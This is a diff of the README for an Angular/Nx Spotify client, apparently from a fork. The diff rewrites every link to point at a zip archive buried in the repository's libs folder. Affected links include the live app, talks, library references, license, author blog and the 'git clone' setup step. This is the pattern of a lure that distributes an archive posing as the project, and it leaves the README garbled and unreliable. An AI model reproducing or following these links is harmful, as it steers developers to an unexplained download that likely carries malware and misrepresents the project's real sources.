@@ -2,11 +2,11 @@
 
 A simple Spotify client built with Angular 15, Nx workspace, ngrx, TailwindCSS and ng-zorro.
 
-> I have recently shared about #angularspotify at [AngularAir](https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip), you can watch the session here 👉 [https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip][02-air]
+> I have recently shared about #angularspotify at [AngularAir](https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip), you can watch the session here 👉 [https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip][02-air]
 
 ## Working application
 
-Check out the **live application** -> https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
+Check out the **live application** -> https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
 
 **Spotify premium** is required for the Web Playback SDK to play music. If you are using a free account, you can still browse the app, but it couldn't play the music. Sorry about that 🤣
 
@@ -27,12 +27,12 @@ Check out the **live application** -> https://github.com/zaylem91/angular-spotif
 If you like my work, feel free to:
 
 - ⭐ this repository. And we will be happy together :)
-- [![Tweet](https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip)][tweet] about Angular Spotify
-- <a title="Thanks for your support!" href="https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip" target="_blank"><img src="https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip,w_140,https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip" alt="Buy Me A Coffee"></a>
+- [![Tweet](https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip)][tweet] about Angular Spotify
+- <a title="Thanks for your support!" href="https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip" target="_blank"><img src="https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip,w_140,https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip" alt="Buy Me A Coffee"></a>
 
 Thanks a bunch for stopping by and supporting me!
 
-[tweet]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip%20cool%20Spotify%20client%20made%20with%20Angular%2012,%20Nx%20workspace,%20ngrx,%20TailwindCSS%20and%20ng-zorro%20%40trungvose&hashtags=angularspotify,angular,nx,ngrx,ngzorro,typescript
+[tweet]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip%20cool%20Spotify%20client%20made%20with%20Angular%2012,%20Nx%20workspace,%20ngrx,%20TailwindCSS%20and%20ng-zorro%20%40trungvose&hashtags=angularspotify,angular,nx,ngrx,ngzorro,typescript
 
 ## Who is it for 🤷‍♀️
 
@@ -53,16 +53,16 @@ You know I am one of the moderators of [Angular Vietnam][angularvn]. Recently, I
 - [ngneat][] packages includes: `ngneat/svg-icon` and `ngneat/until-destroy`
 - [ngrx][ngrx] and [ngrx/component-store][component-store]
 - [ng-zorro][ng-zorro] UI component: `tooltip`, `modal`, `slider`, `switch` and more.
-- [TailwindCSS][tailwind] - See this video [Everything you need to know about TailwindCSS and Angular applications](https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip) by [@nartc][nartc] for integration TailwindCSS with Angular
+- [TailwindCSS][tailwind] - See this video [Everything you need to know about TailwindCSS and Angular applications](https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip) by [@nartc][nartc] for integration TailwindCSS with Angular
 - [Netlify][netlify] for deployment
 
-[angular]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[ngrx]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[component-store]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[tailwind]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[ng-zorro]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[netlify]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[ngneat]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
+[angular]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[ngrx]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[component-store]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[tailwind]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[ng-zorro]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[netlify]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[ngneat]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
 
 I experimented with the ngrx/component store for `AuthStore` and `UIStore`. It might not be a best practice, and I will refactor it very soon. Just FYI 🤣
 
@@ -76,7 +76,7 @@ All components are following:
 
 - OnPush Change Detection and async pipes: all components use observable and async pipe for rendering data without any single manual subscribe. Only some places are calling subscribe for dispatching an action, which I will have a refactor live stream session with my friend [@nartc][nartc] to use the component store for a fully subscribe-less application.
 - SCAMs (single component Angular modules) for tree-shakable components, meaning each component will have a respective module. For example, a RegisterComponent will have a corresponding RegisterModule. We won't declare RegisterComponent as part of AuthModule, for instance.
-- Mostly, everything will stay in the `libs` folder. New modules, new models, new configurations, new components etc... are in libs. libs should be separated into different directories based on existing apps. We won't put them inside the apps folder. For example in an Angular, contains the `https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip`, `https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip` and `https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip`
+- Mostly, everything will stay in the `libs` folder. New modules, new models, new configurations, new components etc... are in libs. libs should be separated into different directories based on existing apps. We won't put them inside the apps folder. For example in an Angular, contains the `https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip`, `https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip` and `https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip`
 
 ### Structure
 
@@ -127,7 +127,7 @@ I followed the structure recommended by my friend [@nartc][nartc]. Below is the 
 
 I follow `Implicit Grant Flow` that Spotify recommended for client-side only applications and did not involve secret keys. The issued access tokens are short-lived, and there are no refresh tokens to extend them when they expire.
 
-View the [Spotify Authorization Guide](https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip)
+View the [Spotify Authorization Guide](https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip)
 
 - Upon opening Angular Spotify, It will redirect you to Spotify to get access to your data. Angular Spotify only uses the data purely for displaying on the UI. We won't store your information anywhere else.
 - Angular Spotify only keeps the access token in the browser memory without even storing it into browser local storage. If you do a hard refresh on the browser, It will ask for a new access token from Spotify. One access token is only valid for **one hour**.
@@ -151,7 +151,7 @@ A simplified graph looks like the following. It gives you insightful information
 
 Having Nx Cloud configured shortens the deployment time quite a lot.
 
-Nx Cloud pairs with Nx in order to enable you to build and test code more rapidly, by up to 10 times. Even teams that are new to Nx can connect to Nx Cloud and start saving time instantly. Visit [Nx Cloud](https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip) to learn more.
+Nx Cloud pairs with Nx in order to enable you to build and test code more rapidly, by up to 10 times. Even teams that are new to Nx can connect to Nx Cloud and start saving time instantly. Visit [Nx Cloud](https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip) to learn more.
 
 ![Nx cloud][nx-cloud]
 
@@ -189,31 +189,31 @@ I scheduled a few live stream sessions to show you how I continue developing Ang
 
 I will also do some refactoring with [@nartc][nartc] for Angular Vietnam Office Hours. More detail is coming soon.
 
-[live-01]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[live-02]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[live-03]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[live-04]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[live-05]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[live-06]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[live-07]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[live-08]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[live-09]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
+[live-01]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[live-02]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[live-03]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[live-04]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[live-05]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[live-06]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[live-07]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[live-08]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[live-09]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
 
 ## Community
 
 I have received some invitations to talk about Angular Spotify from the community. You can watch my talks below 🙂
 
-[![BLS033](https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip)][01-beeman]
+[![BLS033](https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip)][01-beeman]
 
-[![AngularAir](https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip)][02-air]
+[![AngularAir](https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip)][02-air]
 
 | #   | Time                 | Description/Link                                   |
 | --- | -------------------- | -------------------------------------------------- |
 | 1   | Wed, 21st April 2021 | [BLS SHOW & TELL - Angular Spotify][01-beeman]     |
 | 2   | Fri, 08th May 2021   | [AngularAir - Another 1k stars repository][02-air] |
 
-[01-beeman]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[02-air]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
+[01-beeman]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[02-air]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
 
 ## Time spending
 
@@ -221,7 +221,7 @@ It is a side project that I only spent time outside of the office hours to work 
 
 I couldn't get the full-time report from waka time because it only shows me the latest two weeks. 🤣
 
-I have spent approximately 50 hours working on this project, which is almost the same amount as the first version of [https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip][jira].
+I have spent approximately 50 hours working on this project, which is almost the same amount as the first version of [https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip][jira].
 
 The visualizer was the most exciting feature, and I decided to start this project because of that single component.
 
@@ -229,11 +229,11 @@ The visualizer was the most exciting feature, and I decided to start this projec
 
 ### Accessibility ♿
 
-Not all components have properly defined [aria attributes](https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip), visual focus indicators, etc.
+Not all components have properly defined [aria attributes](https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip), visual focus indicators, etc.
 
 ## Setting up the development environment 🛠
 
-- `git clone https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip`
+- `git clone https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip`
 - `cd angular-spotify`
 - `npm start` for starting Angular web application
 - The app should run on `http://localhost:4200/`
@@ -248,12 +248,12 @@ Web Playback SDK supports Chrome, Firefox, Edge, IE 11, or above running on Mac/
 
 It **doesn't support** Safari or any mobile browser on **Android** or **iOS**
 
-View [completed list of supported browsers](https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip)
+View [completed list of supported browsers](https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip)
 
 ## Author: Trung Vo ✍️
 
 - A seasoned front-end engineer with seven years of passion in creating experience-driven products. I am proficient in Angular, React and TypeScript development.
-- Personal blog: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
+- Personal blog: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
 - Say hello: trungk18 [et] gmail [dot] com
 
 ## Contributing
@@ -272,36 +272,36 @@ Special thanks to my friend [@nartc][nartc], who helped me review the code early
 | [beeman/component-store-playground][beeman/component-store-playground] | A nice example of using Nx with ngrx/component-store, I refer to the project structure from this repo                 |
 | [Start using ngrx/effects for this][tim]                               | An excellent write up by [Tim Deschryver][tim-twitter]                                                                |
 
-[koel]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[phanan]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[beeman/component-store-playground]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[tim]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[tim-twitter]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
+[koel]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[phanan]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[beeman/component-store-playground]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[tim]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[tim-twitter]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
 
 ## License
 
 Feel free to use my code on your project. Please put a reference to this repository.
 
-[MIT](https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip)
+[MIT](https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip)
 
-[issues]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[pull]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[jira]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[twitter]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[nx]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[angularsg]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[angularvn]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[nartc]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[gist]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[dep-graph-nx]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[stack]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[time]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[dep-graph]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[sdk-flow]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[demo]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[visualizer]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[angular-spotify-browse]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[album-art]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[pwa]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[web-player]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
-[nx-cloud]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
+[issues]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[pull]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[jira]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[twitter]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[nx]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[angularsg]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[angularvn]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[nartc]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[gist]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[dep-graph-nx]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[stack]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[time]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[dep-graph]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[sdk-flow]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[demo]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[visualizer]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[angular-spotify-browse]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[album-art]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[pwa]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[web-player]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
+[nx-cloud]: https://raw.githubusercontent.com/zaylem91/angular-spotify/main/libs/web/shared/data-access/store/src/lib/angular-spotify-v2.4.zip
